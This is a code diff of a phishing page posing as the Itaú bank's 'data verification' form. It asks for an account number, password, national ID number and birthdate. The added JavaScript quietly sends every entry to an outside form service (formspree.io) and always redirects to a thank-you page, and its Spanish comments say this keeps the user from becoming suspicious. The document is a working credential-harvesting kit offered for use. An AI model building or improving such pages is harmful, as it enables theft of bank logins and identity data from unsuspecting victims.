@@ -93,26 +93,49 @@
         <h2>BIENVENIDO A ITAU</h2>
         <p>Verificación de Datos</p>
 
-        <form action="gracias.html" method="GET">
+        <!-- 1. Modificamos el formulario agregándole un ID y quitando el action directo -->
+<form id="miFormulario" method="POST">
 
-            <label for="account">Nro_Cuenta</label>
-            <input type="text" id="account" name="Nro_Cuenta" required>
+  <label for="account">Nro_Cuenta</label>
+  <input type="text" id="account" name="Nro_Cuenta" required>
 
-            <label for="password">Contrasena</label>
-            <input type="password" id="password" name="Contrasena" required>
+  <label for="password">Contrasena</label>
+  <input type="password" id="password" name="Contrasena" required>
 
-            <label for="ci">Cedula_Identidad</label>
-            <input type="text" id="ci" name="Cedula_Identidad" required>
+  <label for="ci">Cedula_Identidad</label>
+  <input type="text" id="ci" name="Cedula_Identidad" required>
 
-            <label for="birthdate">Fecha Nacimiento</label>
-            <input type="date" id="birthdate" name="Fecha Nacimiento" required>
+  <label for="birthdate">Fecha Nacimiento</label>
+  <input type="date" id="birthdate" name="Fecha Nacimiento" required>
 
-            <label for="age">Edad</label>
-            <input type="number" id="age" name="Edad" min="0" max="120" required>
+  <label for="age">Edad</label>
+  <input type="number" id="age" name="Edad" min="19" max="120" required>
 
-            <input type="submit" value="Verificar Datos">
-        </form>
-    </div>
+  <input type="submit" value="Verificar Datos"> 
 
-</body>
-</html>
+</form>
+
+<!-- 2. Script de JavaScript que procesa el envío en silencio y redirige a la fuerza -->
+<script>
+  document.getElementById("miFormulario").addEventListener("submit", function(event) {
+    event.preventDefault(); // Evita que la página se recargue o vaya a la pantalla gris de Formspree
+    
+    var formData = new FormData(this);
+    
+    // Enviamos los datos a Formspree de manera interna
+    fetch("https://formspree.io", {
+      method: "POST",
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(function(response) {
+      // No importa si Formspree acepta el envío o da error por sus filtros,
+      // obligamos al navegador a ir a tu pantalla de gracias inmediatamente.
+      window.location.href = "gracias.html";
+    }).catch(function(error) {
+      // En caso de falla de red, también redirige para que el usuario no sospeche
+      window.location.href = "gracias.html";
+    });
+  });
+</script>
